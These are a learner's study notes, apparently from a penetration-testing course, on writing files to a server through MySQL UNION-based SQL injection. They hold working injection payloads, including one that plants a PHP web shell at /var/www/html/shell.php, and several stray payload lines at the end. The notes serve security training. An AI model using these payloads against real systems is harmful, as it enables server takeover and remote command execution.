- Before writing files, **we must first check if we have sufficient rights and if the DBMS allows writing files.**
- **==Modern DBMSes disable file-write by default and require certain privileges==** for DBA's to write files.

# Write File Privileges
---
- To be able to write files to the back-end server using a MySQL database, **we require three things:**
	1. **==User with `FILE` privilege enabled==**
	2. **==MySQL global `secure_file_priv` variable not enabled==**
	3. **==Write access to the location we want to write to on the back-end server==**
-  We have **already found that our current user has the `FILE` privilege** necessary to write files.
	- ![[Pasted image 20251024070558.png]]
- We must **now check if the MySQL database has that privilege.** This can be done by checking the `secure_file_priv` global variable.

### **secure_file_priv**
---
- The **[secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from**. 
- An **==empty value lets us read files from the entire file system==**.
- Otherwise, **if a certain directory is set, we can ==only read from the folder specified== by the variable.**
- On the other hand, **==`NULL` means we cannot read/write from any directory.==**
-  MariaDB has this variable **==set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege==**
- However, **`MySQL` uses `/var/lib/mysql-files` as the default folder.**
- Even worse, **some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere** within the system.
- Within `MySQL`, **we can use the following query to obtain the value of this variable:**
	- `SHOW VARIABLES LIKE 'secure_file_priv';`
- However, as we are using a `UNION` injection, **we have to get the value using a `SELECT` statement**
- **`MySQL` global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.**
- We have to s**elect these two columns from that table** in the `INFORMATION_SCHEMA` database.
- We will then **==filter the results to ONLY show the `secure_file_priv` variable,==** using the `WHERE` clause we learned about in a previous section:
	- `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
- Remember to add two more columns `1` & `4` as junk data to have a total of 4 columns':
	- `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
	- ![[Pasted image 20251024070948.png]]

# SELECT INTO OUTFILE
---
- The **[SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files**. 
- This is usually used for exporting data from tables.
- To use it, **we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified**. The below example saves the output of the `users` table into the `/tmp/credentials` file:
	- `SELECT * from users INTO OUTFILE '/tmp/credentials';`

- It is **also possible to ==directly `SELECT` strings into files, allowing us to write arbitrary files**== to the back-end server:
	- `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

- Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

## Writing Files through SQL Injection
---
- The below query should write `file written successfully!` to the `/var/www/html/proof.txt` file, which we can then access on the web application:
	- `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`


- **Note:** **To write a web shell, we must know the base web directory for the web server** (i.e. web root). 
- **One way to find it is to use `load_file` to read the server configuration**, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's **==configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`==**, 
- Or we can search online for other possible configuration locations.
- Furthermore, **we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).** 
- Finally, if none of the above works, ==**we can use server errors displayed to us and try to find the web directory that way**.==

- The UNION injection payload would be as follows:
	- `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

# Writing a Web Shell
---
- We can write the following PHP webshell to be able to execute commands directly on the back-end server:
	- `<?php system($_REQUEST[0]); ?>`
- We can reuse our previous `UNION` injection payload, and change the string to the above, and the file name to `shell.php`:
	- `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
- ![[Pasted image 20251024071328.png]]

hello') UNION SELECT "","", "", 'hello' into outfile '/var/www/chattr-prod/shell.php'-- 
UNION SELECT '','','','this is a test' INTO OUTFILE '/tmp/test.txt'-- 